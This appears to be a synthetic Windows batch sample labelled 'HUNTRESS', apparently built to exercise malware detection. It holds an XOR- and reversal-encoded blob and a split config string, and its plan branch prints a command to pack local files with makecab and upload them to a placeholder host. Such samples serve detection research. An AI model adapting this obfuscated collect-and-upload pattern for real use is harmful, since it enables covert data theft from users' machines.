@echo off

setlocal EnableExtensions EnableDelayedExpansion

rem HUNTRESS-CODEC:reversed_text|xor_5a

rem HUNTRESS-MATERIAL:=4zO1YjKvUnPzYzOsQzM09jNqczOi8DdrJmar1Gb8ImYrVXdgliKu4iMnZDKvUgP7UjNq8iJ4sTO0tmYqtWbsxjYit2dukzP2YTN5YAO7YRKp8DKuQzLSYQOzYDOvogBpgyPp8gBglxZy4yOqUwP5gyL1kiJrJmar1Gb8ImYrdHN9MzOqczO5cmPzUAN9MzOqczO5YyP0UDNn9TP78SP0sjNF4iI/QjJ/0zOv0DN7YTBpkSNokzZyoyOo0jJrdmL08SN5UwP9sjLpYyPi8Dd4sTO/EzO3cGK/4iK74zOm8jL1czPoUgP7UjNq8ido8DPpQzOo4SB/gyOq8DKqYnN7kTN2UwPusTO1YzZpoyPukiJrdGL

rem HUNTRESS-EXTENSION:bat

if /i "%~1"=="--inspect" goto :HUNTRESS_INSPECT

if /i "%~1"=="--plan" goto :HUNTRESS_PLAN

exit /b 0

:HUNTRESS_INSPECT

SeT "v_a0=v=1|steps=locate_local,prepare_transfer,upload_remote|adapter=makecab"
SeT "v_a1=.exe|stage_count=1|graph=cross_language|next_language=none|campaign_i"
SeT "v_a2=d=campaign-188f671081|source_path=C:\Users\Public\HuntressLab\collect"
SeT "v_a3=-188f671081.cab|upload_url=https://188f671081.example.invalid/upload"

goto :HUNTRESS_SEPARATOR_DONE
echo HUNTRESS_SEPARATOR | findstr HUNTRESS >nul
:HUNTRESS_SEPARATOR_DONE

set "neutral_string_join=373a569b"

set "HUNTRESS_READY=1"
if defined HUNTRESS_READY set "cfg="
for %%G in (0 1 2 3) do call set "cfg=%%cfg%%%%v_a%%G%%"

echo(!cfg!

exit /b 0

:HUNTRESS_PLAN

echo makecab.exe upload C:\Users\Public\HuntressLab\collect-188f671081.cab to https://188f671081.example.invalid/upload

exit /b 0

